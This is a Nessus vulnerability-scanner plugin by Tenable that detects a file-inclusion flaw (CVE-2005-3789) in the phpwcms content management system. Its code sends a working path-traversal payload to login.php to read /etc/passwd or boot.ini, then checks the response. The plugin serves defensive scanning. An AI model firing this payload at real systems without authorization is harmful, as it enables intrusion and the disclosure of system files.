#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running phpwcms, an open-source content management
system written in PHP. 

The version of phpwcms installed on the remote host does not sanitize
input to the 'form_lang' parameter of the 'login.php' script before
using it in PHP 'include()' functions.  An unauthenticated attacker
can exploit this issue to read local files and potentially to execute
arbitrary PHP code from local files.  A similar issue affects the
'imgdir' parameter of the 'img/random_image.php' script, although that
can only be used to read local files. 

In addition, the application fails to sanitize user-supplied input
before using it in dynamically-generated pages, which can be used to
conduct cross-site scripting and HTTP response splitting attacks. 
Some of these issues require that PHP's 'register_globals' setting be
enabled. 

See also :

http://www.securityfocus.com/archive/1/416675

Solution :

Unknown at this time.

Risk factor :

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


if (description) {
  script_id(20216);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3789");
  script_bugtraq_id(15436);

  script_name(english:"phpwcms Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in phpwcms");
 
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/phpwcms", "/cms", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Make sure login.php exists.
  req = http_get(item:string(dir, "/login.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does and looks like it's from phpwcms...
  if (
    "phpwcms" >< res &&
    '<input name="form_loginname"' >< res
  ) {
    # Try to read a file.
    foreach file (make_list("/etc/passwd", "boot.ini")) {
      # nb: the app conveniently strips any slashes added by magic_quotes_gpc!
      postdata = string("form_lang=../../../../../../../../../../../../", file, "%00");
      req = string(
        "POST ", dir, "/login.php HTTP/1.1\r\n",
        "Host: ", get_host_name(), "\r\n",
        "Content-Type: application/x-www-form-urlencoded\r\n",
        "Content-Length: ", strlen(postdata), "\r\n",
        "\r\n",
        postdata
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if (res == NULL) exit(0);

      # There's a problem if it looks like one of the files...
      if (
        egrep(pattern:"root:.*:0:[01]:", string:res) ||
        "[boot loader]">< res
      ) {
        if (report_verbosity > 0) {
          contents = res - strstr(res, "<!DOCTYPE HTML PUBLIC");
          if (!contents) contents = res;

          report = string(
            desc,
            "\n\n",
            "Plugin output :\n",
            "\n",
            contents
          );
        }
        else report = desc;

        security_note(port:port, data:report);
        exit(0);
      }
    }
  }
}
